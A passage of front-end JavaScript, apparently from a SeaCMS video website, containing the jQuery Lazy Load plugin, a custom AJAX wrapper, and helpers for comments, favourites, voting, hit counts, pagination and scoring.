  var __js_time = Math.round(new Date() / 1000); 
  $("#time_log").text( __js_time-__php_time );

  $(".stui_header_menu li a").each(function(){
    var _t = $(this);
    var _c = location.pathname;
    if ( _t.attr("href") == _c ) {
      _t.parent("li").addClass("active");
    }
  });

  $("#menu_btn").click(function(){
    // $("#sj-nav-search").hide();
    $("#menu_ul").toggle();
  });
$("#f_qrcode").click(function(){
	$(".qrcode").fadeIn();
});
$(".close-btn").click(function(){
	$(".qrcode").hide();
});

///// 
/*
 * Lazy Load - jQuery plugin for lazy loading images
 *
 * Copyright (c) 2007-2013 Mika Tuupola
 *
 * Licensed under the MIT license:
 *   http://www.opensource.org/licenses/mit-license.php
 *
 * Project home:
 *   http://www.appelsiini.net/projects/lazyload
 *
 * Version:  1.9.1
 *
 */

(function($, window, document, undefined) {
    var $window = $(window);

    $.fn.lazyload = function(options) {
        var elements = this;
        var $container;
        var settings = {
            threshold       : 0,
            failure_limit   : 0,
            event           : "scroll",
            effect          : "show",
            container       : window,
            data_attribute  : "original",
            skip_invisible  : true,
            appear          : null,
            load            : null,
            placeholder     : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"
        };

        function update() {
            var counter = 0;

            elements.each(function() {
                var $this = $(this);
                if (settings.skip_invisible && !$this.is(":visible")) {
                    return;
                }
                if ($.abovethetop(this, settings) ||
                    $.leftofbegin(this, settings)) {
                        /* Nothing. */
                } else if (!$.belowthefold(this, settings) &&
                    !$.rightoffold(this, settings)) {
                        $this.trigger("appear");
                        /* if we found an image we'll load, reset the counter */
                        counter = 0;
                } else {
                    if (++counter > settings.failure_limit) {
                        return false;
                    }
                }
            });

        }

        if(options) {
            /* Maintain BC for a couple of versions. */
            if (undefined !== options.failurelimit) {
                options.failure_limit = options.failurelimit;
                delete options.failurelimit;
            }
            if (undefined !== options.effectspeed) {
                options.effect_speed = options.effectspeed;
                delete options.effectspeed;
            }

            $.extend(settings, options);
        }

        /* Cache container as jQuery as object. */
        $container = (settings.container === undefined ||
                      settings.container === window) ? $window : $(settings.container);

        /* Fire one scroll event per scroll. Not one scroll event per image. */
        if (0 === settings.event.indexOf("scroll")) {
            $container.bind(settings.event, function() {
                return update();
            });
        }

        this.each(function() {
            var self = this;
            var $self = $(self);

            self.loaded = false;

            /* If no src attribute given use data:uri. */
            if ($self.attr("src") === undefined || $self.attr("src") === false) {
                if ($self.is("img")) {
                    $self.attr("src", settings.placeholder);
                }
            }

            /* When appear is triggered load original image. */
            $self.one("appear", function() {
                if (!this.loaded) {
                    if (settings.appear) {
                        var elements_left = elements.length;
                        settings.appear.call(self, elements_left, settings);
                    }
                    $("<img />")
                        .bind("load", function() {

                            var original = $self.attr("data-" + settings.data_attribute);
                            $self.hide();
                            if ($self.is("img")) {
                                $self.attr("src", original);
                            } else {
                                $self.css("background-image", "url('" + original + "')");
                            }
                            $self[settings.effect](settings.effect_speed);

                            self.loaded = true;

                            /* Remove image from array so it is not looped next time. */
                            var temp = $.grep(elements, function(element) {
                                return !element.loaded;
                            });
                            elements = $(temp);

                            if (settings.load) {
                                var elements_left = elements.length;
                                settings.load.call(self, elements_left, settings);
                            }
                        })
                        .attr("src", $self.attr("data-" + settings.data_attribute))
                        .bind("error",function(){
                            var vid = $self.attr("data-vid") || 0;
                            if( vid>0) {
                                //$.get("/include/ajax.php?action=img_err&id="+vid+"&ts="+(+new Date()),function(){});
                            }
                        });
                }
            });

            /* When wanted event is triggered load original image */
            /* by triggering appear.                              */
            if (0 !== settings.event.indexOf("scroll")) {
                $self.bind(settings.event, function() {
                    if (!self.loaded) {
                        $self.trigger("appear");
                    }
                });
            }
        });

        /* Check if something appears when window is resized. */
        $window.bind("resize", function() {
            update();
        });

        /* With IOS5 force loading images when navigating with back button. */
        /* Non optimal workaround. */
        if ((/(?:iphone|ipod|ipad).*os 5/gi).test(navigator.appVersion)) {
            $window.bind("pageshow", function(event) {
                if (event.originalEvent && event.originalEvent.persisted) {
                    elements.each(function() {
                        $(this).trigger("appear");
                    });
                }
            });
        }

        /* Force initial check if images should appear. */
        $(document).ready(function() {
            update();
        });

        return this;
    };

    /* Convenience methods in jQuery namespace.           */
    /* Use as  $.belowthefold(element, {threshold : 100, container : window}) */

    $.belowthefold = function(element, settings) {
        var fold;

        if (settings.container === undefined || settings.container === window) {
            fold = (window.innerHeight ? window.innerHeight : $window.height()) + $window.scrollTop();
        } else {
            fold = $(settings.container).offset().top + $(settings.container).height();
        }

        return fold <= $(element).offset().top - settings.threshold;
    };

    $.rightoffold = function(element, settings) {
        var fold;

        if (settings.container === undefined || settings.container === window) {
            fold = $window.width() + $window.scrollLeft();
        } else {
            fold = $(settings.container).offset().left + $(settings.container).width();
        }

        return fold <= $(element).offset().left - settings.threshold;
    };

    $.abovethetop = function(element, settings) {
        var fold;

        if (settings.container === undefined || settings.container === window) {
            fold = $window.scrollTop();
        } else {
            fold = $(settings.container).offset().top;
        }

        return fold >= $(element).offset().top + settings.threshold  + $(element).height();
    };

    $.leftofbegin = function(element, settings) {
        var fold;

        if (settings.container === undefined || settings.container === window) {
            fold = $window.scrollLeft();
        } else {
            fold = $(settings.container).offset().left;
        }

        return fold >= $(element).offset().left + settings.threshold + $(element).width();
    };

    $.inviewport = function(element, settings) {
         return !$.rightoffold(element, settings) && !$.leftofbegin(element, settings) &&
                !$.belowthefold(element, settings) && !$.abovethetop(element, settings);
     };

    /* Custom selectors for your convenience.   */
    /* Use as $("img:below-the-fold").something() or */
    /* $("img").filter(":below-the-fold").something() which is faster */

    $.extend($.expr[":"], {
        "below-the-fold" : function(a) { return $.belowthefold(a, {threshold : 0}); },
        "above-the-top"  : function(a) { return !$.belowthefold(a, {threshold : 0}); },
        "right-of-screen": function(a) { return $.rightoffold(a, {threshold : 0}); },
        "left-of-screen" : function(a) { return !$.rightoffold(a, {threshold : 0}); },
        "in-viewport"    : function(a) { return $.inviewport(a, {threshold : 0}); },
        /* Maintain BC for couple of versions. */
        "above-the-fold" : function(a) { return !$.belowthefold(a, {threshold : 0}); },
        "right-of-fold"  : function(a) { return $.rightoffold(a, {threshold : 0}); },
        "left-of-fold"   : function(a) { return !$.rightoffold(a, {threshold : 0}); }
    });

})(jQuery, window, document);
/////

$(document).ready(function() {
  $(".lazyload").lazyload({ threshold :180,effect : "fadeIn"});
	var a = $(window);
	$scrollTopLink = $("a.backtop");
	a.scroll(function() {
		500 < $(this).scrollTop() ? $scrollTopLink.css("display", "block") : $scrollTopLink.css("display", "none")
	});
	$scrollTopLink.on("click", function() {
		$("html, body").animate({
			scrollTop: 0
		}, 400);
		return !1
	});

	// 只有一页 则隐藏分页
	// $(".stui-page li.hidden-xs").length
	$(".stui-page").each(function(){
		var _t = $(this);
		if ( _t.find("li.hidden-xs").length == 1 ) {
			_t.hide();
          	$(".nav-page").hide();
		}else{
			$(".stui-page a").each(function(){
				var _t = $(this);
				if( _t.text() == "下一页" ){
					var _url = _t.attr("href");
					setTimeout(function(){
						$.get(_url,function(){});
					},200);
				}
			});
		}
	});

	if (  $("#play_big_btn").length>0 ) {
		setTimeout(function(){
			$.get(  $("#play_big_btn").attr("href") ,function(){});
		},200);
	}

});
function AJAX(G) {
	var K = [],
	$ = this,
	L = AJAX.__pool__ || (AJAX.__pool__ = []); (function(E) {
		var D = function() {};
		E = E ? E: {};
		var C = ["url", "content", "method", "async", "encode", "timeout", "ontimeout", "onrequeststart", "onrequestend", "oncomplete", "onexception"],
		A = ["", "", "GET", true, I("GBK"), 3600000, D, D, D, D, D],
		B = C.length;
		while (B--) $[C[B]] = _(E[C[B]], A[B]);
		if (!N()) return false;
	})(G);
	function _(_, $) {
		return _ != undefined ? _: $
	}
	function N() {
		var A, $ = [window.XMLHttpRequest, "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"];
		for (var B = 0; B < L.length; B += 1) if (L[B].readyState == 0 || L[B].readyState == 4) return L[B];
		for (B = 0; B < $.length; B += 1) {
			try {
				if (window.XMLHttpRequest) {
					A = ($[B] && typeof($[B]) == "function" ? new $[B] : new XMLHttpRequest($[B]));
				}else
				{
					A = ($[B] && typeof($[B]) == "function" ? new $[B] : new ActiveXObject($[B]));
				}	
				break
			} catch(_) {
				A = false;
				continue
			}
		}
		if (!A) {
			throw "Cannot init XMLHttpRequest object!";
			return false
		} else {
			L[L.length] = A;
			
			return A
		}
	}
	function E($) {
		return document.getElementById($)
	}
	function C($) {
		var _ = $ * 1;
		return (isNaN(_) ? 0 : _)
	}
	function D($) {
		return (typeof($) == "string" ? ($ = E($)) ? $: false: $)
	}
	function F() {
		return ((new Date) * 1)
	}
	function M($, _) {
		K[$ + ""] = _
	}
	function H($) {
		return (K[$ + ""])
	}
	function J(_, $, B) {
		return (function A(C) {
			C = C.replace(/([^\u0080-\u00FF]+)/g,
			function($0, $1) {
				return _($1)
			}).replace(/([\u0080-\u00FF])/g,
			function($0, $1) {
				return escape($1).replace("%", "%u00")
			});
			for (var E = 0,
			D = $.length; E < D; E += 1) C = C.replace($[E], B[E]);
			return (C)
		})
	}
	function I($) {
		if ($.toUpperCase() == "UTF-8") return (encodeURIComponent);
		else return (J(escape, [/\+/g], ["%2B"]))
	}
	function O(A, B) {
		if (!A.nodeName) return;
		var _ = "|" + A.nodeName.toUpperCase() + "|";
		if ("|INPUT|TEXTAREA|OPTION|".indexOf(_) > -1) A.value = B;
		else {
			try {
				A.innerHTML = B
			} catch($) {}
		}
	}
	function P(_) {
		if (typeof(_) == "function") return _;
		else {
			_ = D(_);
			if (_) return (function($) {
				O(_, $.responseText)
			});
			else return $.oncomplete
		}
	}
	function B(_, A, $) {
		var C = 0,
		B = [];
		while (C < _.length) {
			B[C] = _[C] ? ($[C] ? $[C](_[C]) : _[C]) : A[C];
			C += 1
		}
		while (C < A.length) {
			B[C] = A[C];
			C += 1
		}
		return B
	}
	function A() {
		var E, C = false,
		K = N(),
		J = B(arguments, [$.url, $.content, $.oncomplete, $.method, $.async, null], [null, null, P, null, null, null]),
		G = J[0],
		I = J[1],
		L = J[2],
		M = J[3],
		H = J[4],
		A = J[5],
		O = M.toUpperCase() == "POST" ? true: false;
		if (!G) {
			throw "url is null";
			return false
		}
		var _ = {
			url: G,
			content: I,
			method: M,
			params: A
		};
		if (!O) G += (G.indexOf("?") > -1 ? "&": "?") + "timestamp=" + F();
		K.open(M, G, H);
		$.onrequeststart(_);
		if (O) K.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		K.setRequestHeader("X-Request-With", "XMLHttpRequest");
		E = setTimeout(function() {
			C = true;
			K.abort()
		},
		$.timeout);
		var D = function() {
			if (C) {
				$.ontimeout(_);
				$.onrequestend(_)
			} else if (K.readyState == 4) {
				clearTimeout(E);
				_.status = K.status;
				try {
					if (K.status == 200) L(K, A);
					else $.onexception(_)
				} catch(B) {
					$.onexception(_)
				}
				$.onrequestend(_)
			}
		};
		K.onreadystatechange = D;
		if (O) K.send(I);
		else K.send("");
		if (H == false) D();
		return true
	}
	this.setcharset = function(_) {
		if (!$.encode) $.encode = I(_)
	};
	this.get = function(C, B, _) {
		return A(C, "", B, "GET", $.async, _)
	};
	this.update = function(H, J, _, D, E) {
		_ = C(_);
		D = C(D);
		if (_ < 1) D = 1;
		var B = function() {
			A(J, "", H, "GET", $.async, E)
		},
		G = F(),
		I = function($) {
			B();
			$--;
			if ($ > 0) M(G, setTimeout(function() {
				I($)
			},
			_))
		};
		I(D);
		return G
	};
	this.stopupdate = function($) {
		clearTimeout(H($))
	};
	this.post = function(D, _, C, B) {
		return A(D, _, C, "POST", $.async, B)
	};
	this.postf = function(O, J, B) {
		var H = [],
		L,
		_,
		G,
		I,
		M,
		K = arguments.length,
		C = arguments;
		O = O ? D(O) : false;
		if (!O || O.nodeName != "FORM") return false;
		validfoo = O.getAttribute("onvalidate");
		validfoo = validfoo ? (typeof(validfoo) == "string" ? new Function(validfoo) : validfoo) : null;
		if (validfoo && !validfoo()) return false;
		var E = O.getAttribute("action"),
		N = O.getAttribute("method"),
		F = $.formToStr(O);
		if (F.length == 0) return false;
		if (N.toUpperCase() == "POST") return A(E, F, J, "POST", true, B);
		else {
			E += (E.indexOf("?") > -1 ? "&": "?") + F;
			return A(E, "", J, "GET", true, B)
		}
	};
	this.formToStr = function(C) {
		var B = "",
		E = "",
		_, A;
		for (var D = 0; D < C.length; D += 1) {
			_ = C[D];
			if (_.name != "") {
				switch (_.type) {
				case "select-one":
					if (_.selectedIndex > -1) A = _.options[_.selectedIndex].value;
					else A = "";
					break;
				case "checkbox":
				case "radio":
					if (_.checked == true) A = _.value;
					break;
				default:
					A = _.value
				}
				A = $.encode(A);
				B += E + _.name + "=" + A;
				E = "&"
			}
		}
		return B
	}
}
//-------------------------------------------------------


function checkAll(bool,tagname,name)
{
	var checkboxArray;checkboxArray=getElementsByName(tagname,name)
	for (var i=0;i<checkboxArray.length;i++){checkboxArray[i].checked = bool;}
}

function checkOthers(tagname,name)
{
	var checkboxArray;checkboxArray=getElementsByName(tagname,name)
	for (var i=0;i<checkboxArray.length;i++){
		if (checkboxArray[i].checked == false){
			checkboxArray[i].checked = true;
		}else if (checkboxArray[i].checked == true){
			checkboxArray[i].checked = false;
		}
	}
}

function textareasize(obj){
	if(obj.scrollHeight > 70){
		obj.style.height = obj.scrollHeight + 'px';
	}
}

function set(obj,value){
	obj.innerHTML = value
}

function view(id){
	document.getElementById(id).style.display='inline'	
}

function hide(id){
	document.getElementById(id).style.display='none'		
}

function getScroll(){var t;if(document.documentElement&&document.documentElement.scrollTop){t=document.documentElement.scrollTop;}else if(document.body){t=document.body.scrollTop;}return(t);} 


function HtmlEncode(str)
{   
	 var s = "";
	 if(str.length == 0) return "";
	 s    =    str.replace(/&/g,"&amp;");
	 s    =    s.replace(/</g,"&lt;");
	 s    =    s.replace(/>/g,"&gt;");
	 s    =    s.replace(/ /g,"&nbsp;");
	 s    =    s.replace(/\'/g,"&#39;");
	 s    =    s.replace(/\"/g,"&quot;"); 
	 return   s;   
}  

function getElementsByName(tag,name){
    var rtArr=new Array();
    var el=document.getElementsByTagName(tag);
    for(var i=0;i<el.length;i++){
        if(el[i].name==name)
              rtArr.push(el[i]);
    }
    return rtArr;
}

function closeWin(){
	document.body.removeChild(document.getElementById("bg")); 
	document.body.removeChild(document.getElementById("msg"));
	if(document.getElementById("searchtype"))document.getElementById("searchtype").style.display="";
}

function openWindow(zindex,width,height,alpha){
	var iWidth = document.documentElement.scrollWidth; 
	var iHeight = document.documentElement.clientHeight; 
	var bgDiv = document.createElement("div");
	bgDiv.id="bg";
	bgDiv.style.cssText = "top:0;width:"+iWidth+"px;height:"+document.documentElement.scrollHeight+"px;filter:Alpha(Opacity="+alpha+");opacity:0.3;z-index:"+zindex+";";
	document.body.appendChild(bgDiv); 
	var msgDiv=document.createElement("div");
	msgDiv.id="msg";
	msgDiv.style.cssText ="z-index:"+(zindex+1)+";width:"+width+"px; height:"+(parseInt(height)-0+29+16)+"px;left:"+((iWidth-width-2)/2)+"px;top:"+(getScroll()+(height=="auto"?150:(iHeight>(parseInt(height)+29+2+16+30)?(iHeight-height-2-29-16-30)/2:0)))+"px";
	msgDiv.innerHTML="<div class='msgtitle'><div id='msgtitle'></div><img onclick='closeWin()' src='/"+sitePath+"pic/btn_close.gif' /></div><div id='msgbody' style='height:"+height+"px'></div>";
	document.body.appendChild(msgDiv);
}

function openWindow2(zindex,width,height,alpha){
	var iWidth = document.documentElement.scrollWidth; 
	var bgDiv = document.createElement("div");
	bgDiv.id="bg";
	bgDiv.style.cssText = "top:0;width:"+iWidth+"px;height:"+document.documentElement.scrollHeight+"px;filter:Alpha(Opacity="+alpha+");opacity:0.3;z-index:"+zindex+";";
	document.body.appendChild(bgDiv); 
	var msgDiv=document.createElement("div");
	msgDiv.id="msg";
	msgDiv.style.cssText ="position: absolute;z-index:"+(zindex+1)+";width:"+width+"px; height:"+(height=="auto"?height:(height+"px"))+";";
	document.body.appendChild(msgDiv);	
}

function selectTogg(){
	var selects=document.getElementsByTagName("select");
	for(var i=0;i<selects.length;i++){
		selects[i].style.display=(selects[i].style.display=="none"?"":"none");
	}
}
function checkInput(str,type){
	switch(type){
		case "mail":
			if(!/^([a-zA-Z0-9]+[_|\-|\.]?)*[a-zA-Z0-9]+@([a-zA-Z0-9]+[_|\-|\.]?)*[a-zA-Z0-9]+\.[a-zA-Z]{2,3}$/gi.test(str)){alert('邮箱填写错误');return false;}
			break;
		case "num" :
			if(isNaN(str)){alert('QQ填写错误');return false;}
			break;
	}
	return true;
}

function copyToClipboard(txt) {    
	if(window.clipboardData){    
		window.clipboardData.clearData();    
		window.clipboardData.setData("Text", txt);
		alert('复制成功！')
	}else{
		alert('请手动复制！')	
	}   
}
function   getUrlArgs()   
  {   
     return  location.pathname;
  }



var ajax = new AJAX();ajax.setcharset("utf-8");
function reportErr(id){openWin("/"+sitePath+"js/err.html?id="+id,400,220,350,250,0)}

function AddFav(vid,uid)
{
	ajax.get( 
		"/"+sitePath+"include/ajax.php?action=addfav&id="+vid+"&uid="+uid,
		function(obj) {
			if (obj.responseText=="err"){
				alert("请先登录!");
				location.href="/"+sitePath+"login.php";
			}else{
				alert("收藏成功!");
			}
		}
	);
}
function AddFav1(vid,plathname,uid)
{
	ajax.get( 
		"/"+sitePath+"include/ajax.php?action=addfav&id="+vid+"&plathname="+plathname+"&uid="+uid,
		function(obj) {
			if (obj.responseText=="err"){
				alert("请先登录!");
				location.href="/"+sitePath+"login.php";
			}else{
				alert("收藏成功!");
			}
		}
	);
}

function viewComment(id,page){
	var url;
	if (page.length==0){url=id;}else{url="/"+sitePath+"comment.php?id="+id+"&page="+page;}
	ajax.get( 
		url,
		function(obj) {
			if (obj.responseText=="err"){
				set(document.getElementById("comment_list"),"<font color='red'>发生错误</font>")	
			}else{
				set(document.getElementById("comment_list"),obj.responseText)	
			}
		}
	);		
}

function submitComment(id){
	if(document.getElementById("username").value.length<1){alert('请填写昵称');return false;}
	if(document.getElementById("msg").value.length<1){alert('请填写内容');return false;}
	ajax.postf(
		document.getElementById("f_comment"),
		function(obj){if(obj.responseText=="ok"){viewComment(id,1);alert('小弟我感谢您的评论!');}else if(obj.responseText=="validateerr"){alert('验证码错误，请点击验证码图片更新验证码！');}else if(obj.responseText=="havecomment"){alert('小样儿你手也太快了，歇会儿再来评论吧！');}else if(obj.responseText=="ipcomment"){alert('您所在的ip不能评论');}else if(obj.responseText=="wordcomment"){alert('您的评论中有禁用词语，不能评论');}/*else{alert(obj.responseText);}*/}
	);
}

function diggVideo(id,div){
	ajax.get(
		"/"+sitePath+"include/ajax.php?id="+id+"&action=digg",
		function (obj){
			var returnValue=Number(obj.responseText)
			if (!isNaN(returnValue)){set(document.getElementById(div),returnValue);alert('(*^__^*) 嘻嘻……，顶得我真舒服！');}else if(obj.responseText=="err"){alert('顶失败')}else if(obj.responseText=="havescore"){alert('(*^__^*) 嘻嘻…… 这么热心啊，您已经顶过了！')}	
		}
	);	
}

function treadVideo(id,div){
	ajax.get(
		"/"+sitePath+"include/ajax.php?id="+id+"&action=tread",
		function (obj){
			var returnValue=Number(obj.responseText)
			if(!isNaN(returnValue)){set(document.getElementById(div),returnValue);alert('小样儿，居然敢踩我！');}else if(obj.responseText=="err"){alert('踩失败')}	else if(obj.responseText=="havescore"){alert('我晕，您已经踩过了，想踩死我啊！')}	
		}
	);	
}

function diggNews(id,div){
	ajax.get("/"+sitePath+"include/ajax.php?id="+id+"&action=diggnews",function (obj){
			var returnValue=Number(obj.responseText)
			if (!isNaN(returnValue)){set(document.getElementById(div),returnValue);alert('(*^__^*) 嘻嘻……，顶得我真舒服！');}else if(obj.responseText=="err"){alert('顶失败')}else if(obj.responseText=="havescore"){alert('(*^__^*) 嘻嘻…… 这么热心啊，您已经顶过了！')}	
		}
	);
}

function treadNews(id,div){
	ajax.get("/"+sitePath+"include/ajax.php?id="+id+"&action=treadnews",function (obj){
			var returnValue=Number(obj.responseText)
			if(!isNaN(returnValue)){set(document.getElementById(div),returnValue);alert('小样儿，居然敢踩我！');}else if(obj.responseText=="err"){alert('踩失败')}	else if(obj.responseText=="havescore"){alert('我晕，您已经踩过了，想踩死我啊！')}	
		}
	);	
}

function alertFrontWin(zindex,width,height,alpha,str){
	openWindow(zindex,width,height,alpha)
	set(document.getElementById("msgbody"),str)
}

function getAspParas(suffix){
	var cur_url=location.href;
	var urlParas=location.search;
	if (cur_url.indexOf("?")>0){
		
		if(cur_url.indexOf("-")>0){
			return urlParas.substring(1,urlParas.indexOf(suffix)).split('-');
		}
		else
		{
			var tmpurl = cur_url.split("?");
			var mytemp = tmpurl[1]; 
			var superx = mytemp.split("&");
			var myarr = new Array(superx[0],superx[1],superx[2]);		
			return myarr;	
		}
	}else{
		return cur_url.substring(cur_url.lastIndexOf("/")+1,cur_url.indexOf(suffix)).split('-')	//伪静态
	}
}

function getHtmlParas(suffix){
		var cur_url=location.href;
		return cur_url.substring(cur_url.lastIndexOf("/")+1,cur_url.indexOf(suffix)).split('-')	//静态

		//var urlParas=location.href;
		//var tempurl = urlParas.replace("http://",""); //去掉 http
		//tempurl = tempurl.replace("//","/"); //避免出现双杠现象
		//var temparr = tempurl.split('/'); //通过 / 划分数组
		//var hosturl = "http://" + temparr[0]; // 主域名
		//var filename = temparr[temparr.length-1]; //文件名
		//var middle = "";
		//var filearr = filename.split('-');
		//middle = urlParas.replace(filename,"")+filearr[0];
		//var myarr = new Array(middle,filearr[1],filename.split('.')[0].split('-')[2]);
		//return myarr;
}

function handleParas(para1,para2){
	var i,fromArray,len1,len2,urlArray,j,dataStr,dataArray
	if (isNaN(para1) || isNaN(para2)){return false}
	fromArray=VideoInfoList.split('$$$')
	len1=fromArray.length;if(para2>len1-1){para2=len1-1}
	for (i=0;i<len1;i++){if (para2==i){urlArray=fromArray[i].split('$$')[1].split('#');len2=urlArray.length;if(para1>len2-1){para1=len2-1};for (j=0;j<len2;j++){if (para1==j){dataStr=urlArray[j];dataArray=dataStr.split('$');return dataArray}}}}
}


function regexpSplice(url,pattern,spanstr) {
   pattern.exec(url);
   return (RegExp.$1+spanstr+ RegExp.$2);
}

function getPageValue(pageGoName){
	var pageGoArray,i,len,pageValue
	pageGoArray=getElementsByName('input',pageGoName) ; len=pageGoArray.length
	for(i=0;i<len;i++){
		pageValue=pageGoArray[i].value;
		if(pageValue.length>0){return pageValue;}
	}
	return ""
}

function getPageGoUrl(maxPage,pageDiv,type,listpagename){
	var str,goUrl
	var url=location.href
	pageNum=getPageValue(pageDiv)
	if (pageNum.length==0||isNaN(pageNum)){alert('输入页码非法');return false;}
	if(pageNum>maxPage){pageNum=maxPage;}
	if(pageNum<1){pageNum=1;}
	switch (type){
		case 1 :
			//dynamic
			//http://127.0.0.1/xxxx/?1.html ; http://127.0.0.1/xxxx/?1-2.html
			str=(pageNum==1)?'':"-"+pageNum;
			goUrl=regexpSplice(url,/(http:\/\/\S+\?\d+)[-]{0,1}\d*(\.html|\.htm|\.shtml|\.shtm|\.asp)/,str);
			break;
		case 2 :
			//dir1
			//http://127.0.0.1/xxxx/xxxx.html ; http://127.0.0.1/xxxx/xxxx2.html
			if(url.lastIndexOf("/")==(url.length-1)){url+=listpagename}
			str=(pageNum==1)?'':pageNum;;
			goUrl=regexpSplice(url,/(http:\/\/\S+?)[\d]*(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str);
			break;
		case 3 :
			//dir2
			//http://127.0.0.1/xxxx/1.html ; http://127.0.0.1/xxxx/1_2.html
			str=(pageNum==1)?'':"_"+pageNum;
			goUrl=(url.split('_').length<3)?regexpSplice(url,/(http:\/\/\S+\d+?)(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str):regexpSplice(url,/(http:\/\/\S+\d+?)_\d+(\.html|\.htm|\.shtml|\.shtm|\.asp)/,str);
			if(goUrl.indexOf('http://')==-1){goUrl=regexpSplice(url,/(http:\/\/\S+_\d+?)(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str);}
			break;
		case 5 :
			//zt
			//http://127.0.0.1/topiclist/?5.html ; http://127.0.0.1/topiclist/?5-2.html
			//http://127.0.0.1/topiclist/xxx.html ; http://127.0.0.1/topiclist/xxx-2.html
			str=(pageNum==1)?'':"-"+pageNum;
			goUrl=(url.split('-').length<2)?regexpSplice(url,/(http:\/\/\S+\d+?)(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str):regexpSplice(url,/(http:\/\/\S+\d+?)-\d+(\.html|\.htm|\.shtml|\.shtm|\.asp)/,str);
			if(goUrl.indexOf('http://')==-1){goUrl=regexpSplice(url,/(http:\/\/\S+\d+?)(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str);}
			break;
		case 6 :
			//forged
			str=(pageNum==1)?'':"-"+pageNum;
			goUrl=regexpSplice(url,/(http:\/\/\S+?)[-]{0,1}[\d]{0,1}(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str);
			break;
		case 7:
			//ztindex
			//http://127.0.0.1/topic/?1.html
			str=pageNum;
			goUrl=regexpSplice(url,/(http:\/\/\S+\?+?)\d+(\.html|\.htm|\.shtml|\.shtm|\.asp|\.php)/,str);
			break;
			}
	location.href=goUrl;
}

function goSearchPage(maxPage,pageDiv,searchtype,searchword){
	var pageNum=getPageValue(pageDiv)
	if (pageNum.length==0||isNaN(pageNum)){alert('输入页码非法');return false;}
	if(pageNum>maxPage){pageNum=maxPage;}
	if(pageNum<1){pageNum=1;}
	location.href='?page='+pageNum+'&searchword='+searchword+'&searchtype='+searchtype;
}

function goCascadePage(maxPage,pageDiv,searchwhere){
	var pageNum=getPageValue(pageDiv)
	if (pageNum.length==0||isNaN(pageNum)){alert('输入页码非法');return false;}
	if(pageNum>maxPage){pageNum=maxPage;}
	if(pageNum<1){pageNum=1;}
	location.href='?page='+pageNum+'&'+searchwhere;
}

function leaveWord(){
	if(document.getElementById("m_author").value.length<1){alert('昵称必须填写');return false;}
	if(document.getElementById("m_content").value.length<1){alert('内容必须填写');return false;}
	ajax.postf(
		document.getElementById("f_leaveword"),
		function(obj){if(obj.responseText=="ok"){viewLeaveWordList(1);alert('留言成功，多谢支持！');document.getElementById("m_content").value='';}else if(obj.responseText=="haveleave"){alert('小样儿你手也太快了，歇会儿再来留言吧！');}else{alert('发生错误');}}
	);
}

function getVideoHit(vid){
	ajax.get(
		"/"+sitePath+"include/ajax.php?action=hit&id="+vid,
		function (obj){
			var result=obj.responseText
			if(result=="err"){set(document.getElementById('hit'),'发生错误')}else{set(document.getElementById('hit'),result);}
		}
	);				
}

function member()
{
	ajax.get( 
		"/"+sitePath+"include/ajax.php?action=member",
		function (obj){
			var result=obj.responseText;
			set(document.getElementById('seacms_member'),result);
		}
	);
}

function getNewsHit(nid){
	ajax.get(
		"/"+sitePath+"include/ajax.php?action=hitnews&id="+nid,
		function (obj){
			var result=obj.responseText
			
			if(result=="err"){set(document.getElementById('hit'),'发生错误')}else{set(document.getElementById('hit'),result);}
		}
	);		
}

function markscore0(vd,d,t,s,l,ac){
	var alt=['很差','较差','还行','推荐','力荐'],url=ac=='news' ? ["/"+sitePath+"include/ajax.php?id="+vd+"&action=newsscore","/"+sitePath+"include/ajax.php?id="+vd+"&action=scorenews&score="] : ["/"+sitePath+"include/ajax.php?id="+vd+"&action=videoscore","/"+sitePath+"include/ajax.php?id="+vd+"&action=score&score="],
	x=d,y=(Math.round(s / x * 100) / 100) || 0,id='BT'+(new Date()).getTime();
	document.write('<div style="padding:5px 10px;border:1px solid #CCC">\
			<div style="color:#000"><strong>我来评分(请您参与评分，体现您的观点)</strong></div>\
			<div>共 <strong style="font-size:14px;color:red" id="MARK_B1"> '+x+' </strong> 个人评分， 平均分 <strong style="font-size:14px;color:red" id="MARK_B2"> '+y+' </strong>， 总得分 <strong style="font-size:14px;color:red" id="MARK_B3"> '+s+' </strong> <strong style="font-size:14px;color:red" id="MARK_B4"></strong></div>\
			<div>');
	for(var i=0;i<=l;i++) document.write('<input type="radio" name="score" id="sint'+i+'" value="1" title="'+alt[parseInt(i/l*(alt.length-1))]+'"/><label for="sint'+i+'">'+i+'</label>');
	document.write(' <input type="button" value=" 评分 " id="'+id+'" style="width:55px;height:21px"/>\
			</div>\
		</div>');
	document.getElementById(id).onclick=function (){
		for(var i=0;i<=l;i++) if(document.getElementById('sint'+i).checked)break;
		if(i>l){alert('你还没选取分数');return;}
		ajax.get(url[1]+i,function (obj){
			if((''+obj.responseText).indexOf("havescore")!=-1){
				alert('你已经评过分啦');
			}else{
				document.getElementById('MARK_B4').innerHTML="评分成功！";

				alert('感谢你的参与!');
			}
		});
		this.disabled=true;
	}
	if(new Date().toGMTString()!=new Date(document.lastModified).toGMTString()) return ajax.get(url[0],function (obj){
		var a=obj.responseText
		try{
			a.replace(/\[(\d+),(\d+),(\d+)\]/i,function ($0,d,t,s){
				var x=parseInt(d),y=(Math.round(parseInt(s) / x * 100) / 100) || 0;
				document.getElementById('MARK_B1').innerHTML=x;
				document.getElementById('MARK_B2').innerHTML=y;
				document.getElementById('MARK_B3').innerHTML=s;
			});
		}catch(ig){}
	});
}
function showpf()
	{document.getElementById('seacmsvpf1').style.display="none";document.getElementById('seacmsvpf2').style.display="inline";}
function markscore1(vd,d,t,s,l,ac){
